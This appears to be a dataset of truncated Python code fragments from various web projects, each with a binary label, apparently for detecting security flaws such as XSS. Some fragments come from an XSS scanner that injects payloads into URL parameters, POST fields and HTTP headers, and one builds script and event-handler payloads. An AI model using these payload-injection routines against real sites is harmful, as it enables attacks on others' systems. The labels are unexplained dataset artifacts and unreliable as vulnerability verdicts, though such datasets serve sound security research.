".update(frappe.get_doc(\"Blog Settings\", \"Blog Settings\").as_dict(no_default_fields=True)) \treturn list_context def get_children(): \treturn frappe.db.sql(\"\"\"select route as name, \t\ttitle from `tabBlog Category`", "label": 0}, {"snippet_id": 25340, "code": "), title=self.scheme['fields'][i][1], placeholder=self.scheme['fields'][i][1], ) final_attrs['data-size']=self.scheme['fields'][i][2] output.append(widget.render(name +'_%s' % i, widget_value, final_attrs", "label": 0}, {"snippet_id": 1046, "code": "\"+parsed_url.netloc+parsed_url.path+\"/?\"+parsed_url.query.replace(value[0], payload) xss_request=req.api_request(xss_url,\"GET\",headers) print xss_request.text if xss_request.text.find(payload) !=-1: impact", "label": 1}, {"snippet_id": 25136, "code": "}\" ' '--depth-limit={depth} ' ).format( start_urls=' '.join(self.start_urls), allowed_domains='localhost', report_dir=self.pa11y_report_dir, reporter=\"1.0-json\", dont_go_here=\"logout\", depth=\"6\", ) return", "label": 0}, {"snippet_id": 7231, "code": "\"university_profile\"), ) urlpatterns +=( url(r'^404$', 'static_template_view.views.render', {'template': '404.html'}, name=\"404\"), ) if not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns +=( url(r'^jobs$", "label": 0}, {"snippet_id": 15870, "code": "\"redirect\": 'true', \"staff\": 'true', \"course_id\": self.course_key, } cms_params=urlencode(auto_auth_params) self.start_urls.append(\"\\\"http://localhost:8031/auto_auth?{}\\\"\".format(cms_params)) sequence_url=", "label": 0}, {"snippet_id": 15709, "code": "-C to exit...\\n' print 'Note: pressing Ctrl-C multiple times can corrupt noseid files and system state. Just press it once.\\n' while True: try: sleep(10000) except KeyboardInterrupt: print \"Stopping bok", "label": 0}, {"snippet_id": 44255, "code": "(request): workflows=[d.content_object.to_dict() for d in Document.objects.get_docs(request.user, Document2, extra='workflow2')] return render('editor/list_editor_workflows.mako', request,{ 'workflows_json':", "label": 1}, {"snippet_id": 7425, "code": " settings.COURSEWARE_ENABLED: urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$', 'courseware.views.jump_to', name=\"jump_to\"), url(r'^courses/(?P<course_id>[^/]+/[^/]", "label": 0}, {"snippet_id": 1955, "code": "+key if post_vul_param: dbupdate.update_record({\"scanid\": scanid},{\"$set\":{\"scan_data\": post_vul_param+\" are vulnerable to XSS\"}}) def xss_http_headers(url,method,headers,body,scanid=None): temp_headers", "label": 0}, {"snippet_id": 38763, "code": "[]) \t\t\t\tvalue=self.__dict__.get(key) \t\t\treturn value \t\telse: \t\t\treturn self.__dict__ \tdef getone(self, key, filters=None): \t\treturn self.get(key, filters=filters, limit=1)[0] \tdef set(self, key, value,", "label": 0}, {"snippet_id": 52015, "code": ".credentials import Credentials from liboozie.oozie_api import get_oozie from liboozie.submission2 import Submission from oozie.decorators import check_document_access_permission, check_document_modify_permission", "label": 0}, {"snippet_id": 2503, "code": ": print url, headers,method,body temp_body={} post_vul_param='' for key,value in body.items(): xss_payloads=fetch_xss_payload() for payload in xss_payloads: temp_body.update(body) temp_body[key]=payload", "label": 0}, {"snippet_id": 17885, "code": "'template': '404.html'}, name=\"404\"), ) if not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns +=( url(r'^jobs$', 'static_template_view.views.render', {'template': 'jobs.html'}, name=\"jobs\"), url(r", "label": 0}, {"snippet_id": 45236, "code": ")) }) def new_coordinator(request): return edit_coordinator(request) @check_document_modify_permission() def save_coordinator(request): response={'status': -1} coordinator_data=json.loads(request.POST.get", "label": 0}, {"snippet_id": 33135, "code": " swarming import user README_MD=( 'https://chromium.googlesource.com/infra/infra/+/master/' 'appengine/cr-buildbucket/README.md' ) class MainHandler(webapp2.RequestHandler): \"\"\"Redirects to README.md.\"\"\"", "label": 0}, {"snippet_id": 39991, "code": " comma_options)) \tdef _validate_constants(self): \t\tif frappe.flags.in_import or self.is_new() or self.flags.ignore_validate_constants: \t\t\treturn \t\tconstants=[d.fieldname for d in self.meta.get(\"fields\",{", "label": 0}, {"snippet_id": 13196, "code": ".contrib.auth.views.password_change_done, name='auth_password_change_done'), url(r'^password_reset_confirm/(?P<uidb36>[0-9A-Za-z]+)-(?P<token>.+)/$', 'student.views.password_reset_confirm_wrapper', name", "label": 0}, {"snippet_id": 37621, "code": ".get_value(\"Blog Category\",{\"name\": route}, \"title\") or route def get_blog_list(doctype, txt=None, filters=None, limit_start=0, limit_page_length=20, order_by=None): \tconditions=[] \tif filters: \t\tif filters", "label": 0}, {"snippet_id": 10546, "code": " zxf{dir}demo_course.tar.gz -C{dir}'.format(dir=suite.imports_dir)), ]) def test_generate_html_reports(self): suite=Pa11yCrawler('') suite.generate_html_reports() self._mock_sh.assert_has_calls([ call(", "label": 0}, {"snippet_id": 45048, "code": "=\"application/json\") def _submit_workflow(user, fs, jt, workflow, mapping): try: submission=Submission(user, workflow, fs, jt, mapping) job_id=submission.run() return job_id except RestException, ex: detail", "label": 0}, {"snippet_id": 8472, "code": ") urlpatterns=('', url(r'^update_certificate$', 'certificates.views.update_certificate'), url(r'^$', 'branding.views.index', name=\"root\"), url(r'^dashboard$', 'student.views.dashboard', name=\"dashboard", "label": 0}, {"snippet_id": 35452, "code": "'name', cache=True)) \t\t\t\telse: \t\t\t\t\tvalues_to_fetch=['name'] +[_df.fetch_from.split('.')[-1] \t\t\t\t\t\tfor _df in fields_to_fetch] \t\t\t\t\t \t\t\t\t\tvalues=frappe.db.get_value(doctype, docname, \t\t\t\t\t\tvalues_to_fetch", "label": 0}, {"snippet_id": 25665, "code": "[0] else: initial=None tz=pytz.timezone(event.settings.timezone) help_text=rich_text(q.help_text) if q.type==Question.TYPE_BOOLEAN: if q.required: widget=forms.CheckboxInput(attrs={'required': 'required", "label": 0}, {"snippet_id": 19654, "code": "}demo_course.tar.gz'.format(targz=suite.tar_gz_file, dir=suite.imports_dir)), call( 'tar zxf{dir}demo_course.tar.gz -C{dir}'.format(dir=suite.imports_dir)), ]) def test_generate_html_reports(self): suite", "label": 0}, {"snippet_id": 9002, "code": "[^/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$', 'courseware.module_render.xqueue_callback', name='xqueue_callback'), url(r'^change_setting$', 'student.views.change_setting', name='change_setting'), url(r", "label": 0}, {"snippet_id": 36967, "code": " Post`.blog_category=`tabBlog Category`.name and published=1) \t\torder by title asc\"\"\", as_dict=1) def clear_blog_cache(): \tfor blog in frappe.db.sql_list(\"\"\"select route from \t\t`tabBlog Post` where ifnull", "label": 0}, {"snippet_id": 55038, "code": " @require_POST @require_AJAX @transaction.atomic def batch_edit_translations(request): \"\"\"Perform an action on a list of translations. Available actions are defined in `ACTIONS_FN_MAP`. Arguments to this view are", "label": 0}, {"snippet_id": 11856, "code": "'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'), (r'^favicon\\.ico$', 'django.views.generic.simple.redirect_to',{'url': '/static/images/favicon.ico'}),", "label": 0}, {"snippet_id": 6112, "code": " IdP application configuration. Loads configuration from an INI-file at instantiation. :param filename: string, INI-file name :param debug: boolean, default debug value :raise ValueError: if INI-file can", "label": 0}, {"snippet_id": 12369, "code": "[^/]+)/instructor$', 'instructor.views.instructor_dashboard', name=\"instructor_dashboard\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$', 'instructor.views.gradebook', name='gradebook'),", "label": 0}, {"snippet_id": 36470, "code": " extract_images_from_doc \t\tif self.doctype !=\"DocType\": \t\t\tfor df in self.meta.get(\"fields\",{\"fieldtype\":('=', \"Text Editor\")}): \t\t\t\textract_images_from_doc(self, df.fieldname) def _filter(data, filters, limit", "label": 0}, {"snippet_id": 6444, "code": " self.config.get(self.section, 'cert_chain') @property def userdb_mongo_uri(self): \"\"\" UserDB MongoDB connection URI(string). See MongoDB documentation for details. \"\"\" return self.config.get(self.section,", "label": 0}, {"snippet_id": 54632, "code": ".extensions.toc', ]) return queryset class ArticleDetail(DetailView, FormMixin): \"\"\"\u5904\u7406\u5355\u7bc7\u6587\u7ae0\u8be6\u60c5\u9875\u7684\u663e\u793a\u3002 \u4ee5\u53ca\u6240\u6709\u7559\u8a00\u7684\u663e\u793a FormMixin \u5904\u7406\u7559\u8a00\u7684\u4e0a\u4f20 \u3002 \"\"\" model=Article context_object_name='article' template_name='details.html", "label": 1}, {"snippet_id": 25763, "code": ", widget=forms.Textarea, initial=initial.answer if initial else None, ) elif q.type==Question.TYPE_CHOICE: field=forms.ModelChoiceField( queryset=q.options, label=q.question, required=q.required, help_text", "label": 0}, {"snippet_id": 38125, "code": ".form_dict.blogger}, \"full_name\") \t\tlist_context.sub_title=_(\"Posts by{0}\").format(blogger) \t\tlist_context.title=blogger \telif frappe.local.form_dict.txt: \t\tlist_context.sub_title=_('Filtered by \"{0}\"')", "label": 1}, {"snippet_id": 34080, "code": "\t\tpost.category=frappe.db.get_value('Blog Category', post.blog_category, \t\t\t['route', 'title'], as_dict=True) \t\tif post.avatar and(not \"http:\" in post.avatar and not \"https:\" in post.avatar) and not post", "label": 0}, {"snippet_id": 54938, "code": "'fuzzy_strings', 'strings_with_errors', 'strings_with_warnings', 'unreviewed_strings', ]) locale.aggregate_stats() for project in projects: project.aggregate_stats() ProjectLocale.objects.get(locale=locale, project", "label": 0}, {"snippet_id": 7828, "code": ", name='gradebook'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$', 'instructor.views.grade_summary', name='grade_summary'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$", "label": 0}, {"snippet_id": 11369, "code": ".get_test_course() super(Pa11yCrawler, self).__enter__() def get_test_course(self): \"\"\" Fetches the test course. \"\"\" self.imports_dir.makedirs_p() zipped_course=self.imports_dir +'demo_course.tar.gz' msg=colorize(", "label": 0}, {"snippet_id": 260, "code": ".logs as logs import urlparse from utils.logger import logger from utils.db import Database_update from utils.config import get_value dbupdate=Database_update() api_logger=logger() def fetch_xss_payload()", "label": 0}, {"snippet_id": 44719, "code": " response={'status': -1} node=json.loads(request.POST.get('node', '{}')) properties=json.loads(request.POST.get('properties', '{}')) copied_properties=json.loads(request.POST.get('copiedProperties', '{}'", "label": 0}, {"snippet_id": 2782, "code": "+payload,\"GET\",headers) if result is not True: decoded_payload=xss_payload_decode(payload) if xss_request_url.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_request_url.headers) attack_result=", "label": 0}, {"snippet_id": 46809, "code": ") ref_id=fields.IntField(default=0) kind=K_COMMENT class Meta: table='comments' async def set_content(self, content): return await self.set_props_by_key('content', content) async def save(self, *args, ", "label": 0}, {"snippet_id": 49518, "code": " issubclass(type(self.model_field), ForeignKey): pks=self.object_list.order_by().distinct().values_list('%s__pk' % self.field_name, flat=True) remote_field=self.model_field.rel if hasattr(self.model_field, 'rel", "label": 0}, {"snippet_id": 9245, "code": "\"html_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$', 'courseware.views.index', name=\"courseware\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$'", "label": 0}, {"snippet_id": 29350, "code": ".get_setting('haproxy_config_path')] \t\telse: \t\t\tcommands=[ \"sudo haproxy -q -c -f \" +tmp_file +\"&& sudo mv -f \" +tmp_file +\" \" +sql.get_setting('haproxy_config_path') +\" && sudo \" +sql.get_setting('restart_command", "label": 0}, {"snippet_id": 38050, "code": "\"), \"route\":\"/\"}, \t\t\t{\"name\": \"Blog\", \"route\": \"/blog\"}, \t\t\t{\"label\": context.category.title, \"route\":context.category.route}] def get_list_context(context=None): \tlist_context=frappe._dict( \t\ttemplate", "label": 0}, {"snippet_id": 19329, "code": " test_serversonly(self): suite=BokChoyTestSuite('', serversonly=True) self.assertEqual(suite.cmd, \"\") def test_verify_xss(self): suite=BokChoyTestSuite('', verify_xss=True) name='tests' self.assertEqual(suite.cmd", "label": 1}, {"snippet_id": 20867, "code": ", kwargs={'org_id': 'RiceX'}), url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'ANUx'}), url(r'^(?i)university_profile", "label": 0}, {"snippet_id": 51731, "code": ", {'name': 'internet_nl_dashboard.urllist'}, {'name': 'internet_nl_dashboard.uploadlog'}, ]}, {'label': _('\ud83d\udd52 Periodic Tasks'), 'items':[ {'name': 'app.job'}, {'name': 'django_celery_beat.periodictask'}", "label": 0}, {"snippet_id": 15712, "code": "' print 'Note: pressing Ctrl-C multiple times can corrupt noseid files and system state. Just press it once.\\n' while True: try: sleep(10000) except KeyboardInterrupt: print \"Stopping bok-choy servers.", "label": 0}, {"snippet_id": 36676, "code": ".published_on=today() \t\t \t\tfrappe.db.sql(\"\"\"update tabBlogger set posts=(select count(*) from `tabBlog Post` \t\t\twhere ifnull(blogger,'')=tabBlogger.name) \t\t\twhere name=%s\"\"\",(self.blogger,)) \tdef on_update(self): ", "label": 0}, {"snippet_id": 41723, "code": " \t@property \tdef meta(self): \t\tif not hasattr(self, \"_meta\"): \t\t\tself._meta=frappe.get_meta(self.doctype) \t\treturn self._meta \tdef update(self, d): \t\tif \"doctype\" in d: \t\t\tself.set(\"doctype\", d.get(\"doctype", "label": 0}, {"snippet_id": 20357, "code": "-with-save-baseline\") cmd.append(self.extra_args) cmd=(\" \").join(cmd) return cmd class Pa11yCrawler(BokChoyTestSuite): \"\"\" Sets up test environment with mega-course loaded, and runs pa11ycralwer against", "label": 0}, {"snippet_id": 45886, "code": ".jt, properties=properties) job_id=submission.run() return job_id except RestException, ex: raise PopupException(_(\"Error submitting bundle %s\") %(bundle,), detail=ex._headers.get('oozie-error-message'", "label": 0}, {"snippet_id": 18888, "code": "('AUTH_USE_OPENID_PROVIDER'): urlpatterns +=( url(r'^openid/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'), url(r'^openid/provider/login/(?:.+)$', 'external_auth", "label": 0}, {"snippet_id": 45025, "code": "'editor/submit_job_popup.mako', request,{ 'params_form': params_form, 'action': reverse('oozie:editor_submit_workflow', kwargs={'doc_id': workflow.id}) }, force_template=True).content return HttpResponse", "label": 0}, {"snippet_id": 50017, "code": ".compile(r\"%s\" % settings.SCREENREADER_REGEX_STRIP, re.DOTALL +re.MULTILINE) _SERVERNAME=settings.SERVERNAME _KEEPALIVE=30 class LazyEncoder(json.JSONEncoder): def default(self, obj): if isinstance(obj,", "label": 0}, {"snippet_id": 43867, "code": "\tif self.get('parent_doc'): \t\t\t\t\tself.parent_doc.get_latest() \t\t\t\t\tref_doc=[d for d in self.parent_doc.get(self.parentfield) if d.name==self.name][0] \t\t\t\telse: \t\t\t\t\tref_doc=self.get_latest() \t\t\tfor df in", "label": 0}, {"snippet_id": 27143, "code": "] hidden_param_name=[] hidden_param_value=[] page=\"\" if has_form==1: m_input=re.match(r'.*\\<(input|button)\\s[^\\>]*name=\"(\\w+)\"', line, re.M|re.I) if m_input: m_value=re.match(r'.*\\<(input|button)\\s[^\\>", "label": 1}, {"snippet_id": 5949, "code": "</script>\" % self.url return payload def event(self, element, src, event, js): payload=\"<%s src=\" % element payload +='\"%s\" ' % src payload +=event payload +=\"=%s >\" % js return payload def cspBypass(self", "label": 0}, {"snippet_id": 27636, "code": ".\"\"\" self.response.headers['Strict-Transport-Security']=( 'max-age=2592000; includeSubdomains') self.response.headers['X-Content-Type-Options']='nosniff' self.response.headers['X-Frame-Options']='deny'", "label": 0}, {"snippet_id": 11279, "code": "'course_key') if self.imports_dir: self.should_fetch_course=False else: self.should_fetch_course=kwargs.get('should_fetch_course') self.imports_dir=path('test_root/courses/') self.pa11y_report_dir=os.path.join", "label": 0}, {"snippet_id": 11034, "code": ".load_courses() msg=colorize('green', \"Confirming servers are running...\") print msg bokchoy_utils.start_servers(self.default_store, self.coveragerc) def load_courses(self): \"\"\" Loads courses from self", "label": 0}, {"snippet_id": 44200, "code": " import PopupException from desktop.lib.i18n import smart_str from desktop.lib.rest.http_client import RestException from desktop.models import Document, Document2 from liboozie.credentials import Credentials", "label": 0}, {"snippet_id": 26312, "code": " raise ValidationError(_('This VAT ID is not valid. Please re-check your input.')) except vat_moss.errors.WebServiceUnavailableError: logger.exception('VAT ID checking failed for country{}'.format(data.get", "label": 0}, {"snippet_id": 52758, "code": "'POST': params_form=ParametersFormSet(request.POST) if params_form.is_valid(): mapping=dict([(param['name'], param['value']) for param in params_form.cleaned_data]) job_id=_submit_workflow(request.user", "label": 0}, {"snippet_id": 12199, "code": "/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)", "label": 1}, {"snippet_id": 17992, "code": ".MITX_FEATURES[\"USE_CUSTOM_THEME\"]: template=\"theme-\" +template urlpatterns +=(url(r'^%s' % key.lower(), 'static_template_view.views.render', {'template': template}, name=value),) if settings.PERFSTATS", "label": 0}, {"snippet_id": 7445, "code": "(?P<location>.*?)/(?P<dispatch>[^/]*)$', 'courseware.module_render.modx_dispatch', name='modx_dispatch'), url(r'^software-licenses$', 'licenses.views.user_software_license', name=\"user_software_license", "label": 0}, {"snippet_id": 32665, "code": "._Read(path[1:]) md=markdown.Markdown(extensions=extensions, extension_configs=extension_configs, tab_length=2, output_format='html4') has_a_single_h1=(len([line for line in contents.splitlines() if(line", "label": 0}, {"snippet_id": 27627, "code": ") def _add_security_response_headers(self): \"\"\"Add security-related headers to response.\"\"\" self.response.headers['Strict-Transport-Security']=( 'max-age=2592000; includeSubdomains') self.response.headers", "label": 0}, {"snippet_id": 6360, "code": " data on every login. \"\"\" return self.config.get(self.section, 'fticks_secret_key') @property def fticks_format_string(self): \"\"\" Get SAML F-TICKS format string. \"\"\" return self.config.get(self.section", "label": 0}, {"snippet_id": 15782, "code": "'\".format(self.log_dir), \"VERIFY_XSS='{}'\".format(self.verify_xss), \"nosetests\", test_spec, \"{}\".format(self.verbosity_processes_string()) ] if self.pdb: cmd.append(\"--pdb\") if self.save_screenshots: cmd", "label": 0}, {"snippet_id": 14803, "code": ", 'True') with self.env_var_override: suite=BokChoyTestSuite('') name='tests' self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True)) def test_test_dir(self): test_dir='foo' suite", "label": 1}, {"snippet_id": 40088, "code": "\t\t \t\t\t\tcontinue \t\t\tcolumn_type=type_map[df.fieldtype][0] or None \t\t\tdefault_column_max_length=type_map[df.fieldtype][1] or None \t\t\tif df and df.fieldtype in type_map and column_type in column_types_to_check_length", "label": 0}, {"snippet_id": 45668, "code": "', uuid__in=[c['coordinator'] for c in bundle_data['coordinators']]) for doc in dependencies: doc.doc.get().can_read_or_exception(request.user) bundle_doc.dependencies=dependencies bundle_doc.update_data", "label": 0}, {"snippet_id": 8981, "code": ">[^/]*)$', 'courseware.module_render.modx_dispatch', name='modx_dispatch'), url(r'^software-licenses$', 'licenses.views.user_software_license', name=\"user_software_license\"), url(r'^courses/(?P<course_id", "label": 0}, {"snippet_id": 18014, "code": "'^reprofile$', 'perfstats.views.end_profile'),) if settings.WIKI_ENABLED: from wiki.urls import get_pattern as wiki_pattern from django_notify.urls import get_pattern as notify_pattern urlpatterns +=( url(", "label": 0}, {"snippet_id": 28281, "code": ".diff_config(oldcfg, cfg) \t \t \t \t \t \t\t \tos.system(\"/bin/rm -f \" +hap_configs_dir +\"*.old\") template=template.render(h2=1, title=\"Working with HAProxy configs\", \t\t\t\t\t\t\trole=role, \t\t\t\t\t\t\taction=\"config.py\", ", "label": 0}, {"snippet_id": 46361, "code": ", 'mobile': is_mobile }) def browse_m(request, name): return browse(request, name, True) @allow_owner_only def save(request): response={'status': -1} collection=json.loads(request.POST.get('collection'", "label": 0}, {"snippet_id": 25209, "code": ".helpers.i18n import get_format_without_seconds from pretix.presale.signals import question_form_fields logger=logging.getLogger(__name__) class NamePartsWidget(forms.MultiWidget): widget=forms.TextInput", "label": 0}, {"snippet_id": 30338, "code": "\tprint('Oops. Connection timeout occured!') \texcept requests.exceptions.ReadTimeout: \t\tprint('Oops. Read timeout occured') \texcept requests.exceptions.HTTPError as errh: \t\tprint(\"Http Error:\",errh) \texcept", "label": 0}, {"snippet_id": 26962, "code": "\"response_\" +str(form_counter) +\"_\" +str(counter) +\".html\", \"w\") as f: f.write(r.content) if r.content.find(xss)>=0: print \"[+] Target is VULNERABLE\" print \"Url: \" +url print \"Parameters: %s\\n\" % str(post_params", "label": 0}, {"snippet_id": 54675, "code": ") context['comments']=self.object.comment_set.all().order_by('-time') context['form']=self.get_form() context['md']=markdown(self.object.content, extensions=[ 'markdown.extensions.extra', 'markdown.extensions", "label": 1}, {"snippet_id": 9086, "code": ".views.course_info', name=\"course_root\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$', 'courseware.views.course_info', name=\"info\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$',", "label": 0}, {"snippet_id": 32549, "code": "/master'): path=path[len('/chromium/src/+/master'):] full_path=os.path.realpath(os.path.join(self.server.top_level, path[1:])) if not full_path.startswith(self.server.top_level): self._DoUnknown() elif", "label": 0}, {"snippet_id": 36879, "code": "=frappe.db.get_value(\"Blogger\",{\"name\": frappe.local.form_dict.blogger}, \"full_name\") \t\tlist_context.sub_title=_(\"Posts by{0}\").format(blogger) \t\tlist_context.title=blogger \telif frappe.local.form_dict", "label": 0}, {"snippet_id": 2614, "code": " host_header={\"Host\": parse_domain +'/' +payload} headers.update(host_header) host_header_xss=req.api_request(url, \"GET\", headers) decoded_payload=xss_payload_decode(payload) if host_header_xss.text.find", "label": 0}, {"snippet_id": 17313, "code": ".get('AUTH_USE_SHIB'): urlpatterns +=( url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'), ) if settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'): urlpatterns +=( url(r", "label": 0}, {"snippet_id": 12278, "code": ">[^/]+/[^/]+/[^/]+)/courseware/?$', 'courseware.views.index', name=\"courseware\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$', 'courseware.views.index', name=\"courseware_chapter", "label": 0}, {"snippet_id": 20718, "code": "'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'), url(r'^logout$', 'student.views.logout_user', name='logout'), url(r'^create_account$', 'student.views.create_account'), url(r'^activate/(?P<key", "label": 0}, {"snippet_id": 19683, "code": " from time import sleep from urllib import urlencode from common.test.acceptance.fixtures.course import CourseFixture, FixtureError from path import Path as path from paver.easy import sh, BuildFailure", "label": 0}, {"snippet_id": 52625, "code": " * 1024 ** 2) if node_data['type'] in('hive', 'hive2'): parameters=parameters.union(set(find_dollar_braced_variables(data))) elif node_data['type']=='pig': parameters=parameters.union(set(find_dollar_variables", "label": 0}, {"snippet_id": 32762, "code": " for i, line in enumerate(data.splitlines(), start=1): self.wfile.write( ('<tr class=\"u-pre u-monospace FileContents-line\">' '<td class=\"u-lineNum u-noSelect FileContents-lineNum\">' '<a name=\"%(num)s\" '", "label": 0}, {"snippet_id": 25773, "code": "==Question.TYPE_CHOICE: field=forms.ModelChoiceField( queryset=q.options, label=q.question, required=q.required, help_text=help_text, widget=forms.Select, empty_label='', initial=initial.options.first(", "label": 0}, {"snippet_id": 3339, "code": "\".format(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting via referer header\", \"impact\": impact, \"req_headers\": temp_headers", "label": 0}, {"snippet_id": 37191, "code": "'Blog Category', post.blog_category, \t\t\t['route', 'title'], as_dict=True) \t\tif post.avatar and(not \"http:\" in post.avatar and not \"https:\" in post.avatar) and not post.avatar.startswith(\"/\"): \t\t\tpost.avatar", "label": 0}, {"snippet_id": 51260, "code": " admin.site.register(Group, GroupAdmin) class CustomConfigForm(ConstanceForm): def __init__(self, *args, **kwargs): super(CustomConfigForm, self).__init__(*args, **kwargs) class ConfigAdmin(ConstanceAdmin):", "label": 0}, {"snippet_id": 14143, "code": "<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')), ) if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'): urlpatterns +=( url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=", "label": 0}, {"snippet_id": 40597, "code": "=doc, currency=currency) \tdef is_print_hide(self, fieldname, df=None, for_print=True): \t\t\"\"\"Returns true if fieldname is to be hidden for print. \t\tPrint Hide can be set via the Print Format Builder or in", "label": 0}, {"snippet_id": 16055, "code": " admin.autodiscover() urlpatterns=('', url(r'^update_certificate$', 'certificates.views.update_certificate'), url(r'^$', 'branding.views.index', name=\"root\"), url(r'^dashboard$', 'student.views.dashboard", "label": 0}, {"snippet_id": 37832, "code": ".website.render import clear_cache from frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown from frappe.website.utils import find_first_image, get_comment_list class", "label": 1}, {"snippet_id": 30528, "code": "'rows1') \tgrep=form.getvalue('grep') \thour=form.getvalue('hour') \tminut=form.getvalue('minut') \thour1=form.getvalue('hour1') \tminut1=form.getvalue('minut1') \tdate=hour+':'+minut \tdate1=hour1+':'+minut1 ", "label": 0}, {"snippet_id": 7081, "code": "\"begin_exam_registration\"), url(r'^create_exam_registration$', 'student.views.create_exam_registration'), url(r'^password_reset/$', 'student.views.password_reset', name='password_reset'), url(r'^password_change", "label": 0}, {"snippet_id": 28184, "code": " not None: \t \ttry: \t\tfunct.logging(serv, \"config.py open config\") \texcept: \t\tpass \t \terror=funct.get_config(serv, cfg) \t \ttry: \t\tconf=open(cfg, \"r\") \t\tconfig_read=conf.read() \t\tconf.close \texcept IOError", "label": 0}, {"snippet_id": 24073, "code": ".verbosity_processes_string(suite), expected_verbosity_string) def test_invalid_verbosity_and_processes(self): \"\"\" If an invalid combination of verbosity and number of processors is passed in, a BuildFailure should be raised \"", "label": 0}, {"snippet_id": 49632, "code": "(self): \"\"\" Transform list_display into list of SmartColumns In list_display we expect: 1. name of the field(string) or 2. two element iterable in which: -first element is name of the field(string) or callable", "label": 0}, {"snippet_id": 19869, "code": " Env.BOK_CHOY_REPORT_DIR) self.xunit_report=self.report_dir / \"xunit.xml\" self.cache=Env.BOK_CHOY_CACHE self.fasttest=kwargs.get('fasttest', False) self.serversonly=kwargs.get('serversonly', False) self", "label": 0}, {"snippet_id": 33689, "code": " comments').format(len(context.comment_list)) \t\tcontext.category=frappe.db.get_value(\"Blog Category\", \t\t\tcontext.doc.blog_category,[\"title\", \"route\"], as_dict=1) \t\tcontext.parents=[{\"name\": _(\"Home\"), \"route", "label": 0}, {"snippet_id": 26872, "code": "\"http://\")==0 or page.find(\"https://\")==0: furl=page else: if _url.find(\"https://\")==0: furl=\"https://\" +host +\"/\" +page else: furl=\"http://\" +host +\"/\" +page print \"[+] XSS check for: \" +furl if DEBUG==1:", "label": 0}, {"snippet_id": 11352, "code": "(auto_auth_params) self.start_urls.append(\"\\\"http://localhost:8003/auto_auth?{}\\\"\".format(lms_params)) def __enter__(self): if self.should_fetch_course: self.get_test_course() super(Pa11yCrawler, self)", "label": 0}, {"snippet_id": 1110, "code": "\"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) result,db_update=True,True vul_param +=key else: result=True if vul_param=='': vul_param +=key else", "label": 0}, {"snippet_id": 51357, "code": "'][::-1] fields=('name', 'account', 'urls') @admin.register(UploadLog) class UploadLogAdmin(ImportExportModelAdmin, admin.ModelAdmin): list_display=('original_filename', 'internal_filename', 'message',", "label": 1}, {"snippet_id": 35018, "code": "(e.args[1]): \t\t\t\t\tif self.meta.autoname==\"hash\": \t\t\t\t\t\t \t\t\t\t\t\tself.name=None \t\t\t\t\t\tself.db_insert() \t\t\t\t\t\treturn \t\t\t\t\traise frappe.DuplicateEntryError(self.doctype, self.name, e) \t\t\t\telif \"Duplicate\" in", "label": 0}, {"snippet_id": 15472, "code": " traceback) if self.testsonly: msg=colorize('green', 'Running in testsonly mode... SKIPPING database cleanup.') print msg else: msg=colorize('green', \"Cleaning up databases...\") print msg sh(\"./manage.py lms ", "label": 0}, {"snippet_id": 39523, "code": " self.name, 'modified', self.modified, update_modified=False) \tdef _fix_numeric_types(self): \t\tfor df in self.meta.get(\"fields\"): \t\t\tif df.fieldtype==\"Check\": \t\t\t\tself.set(df.fieldname, cint(self.get(df", "label": 0}, {"snippet_id": 13965, "code": " 'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$', 'open_ended_grading.staff_grading_service", "label": 0}, {"snippet_id": 30129, "code": "\"] \tfunct.ssh_command(serv, commands, ip=\"1\") \t if form.getvalue('showif'): \tcommands=[\"sudo ip link|grep 'UP' | awk '{print $2}' |awk -F':' '{print $1}'\"] \tfunct.ssh_command(serv, commands, ip=\"1\") \t if", "label": 0}, {"snippet_id": 44748, "code": "(_property['name'], _property['value']) for _property in properties])) if copied_properties: _properties.update(copied_properties) response['status']=0 response['properties']=_properties response['name']='%s-%s", "label": 0}, {"snippet_id": 51646, "code": "'OPTIONS': DATABASE_OPTIONS.get(os.environ.get('DB_ENGINE', 'mysql'),{}) } } DATABASE=os.environ.get('DJANGO_DATABASE', 'dev') DATABASES={'default': DATABASES_SETTINGS[DATABASE]} AUTH_PASSWORD_VALIDATORS=", "label": 0}, {"snippet_id": 7812, "code": "[^/]+)/instructor$', 'instructor.views.instructor_dashboard', 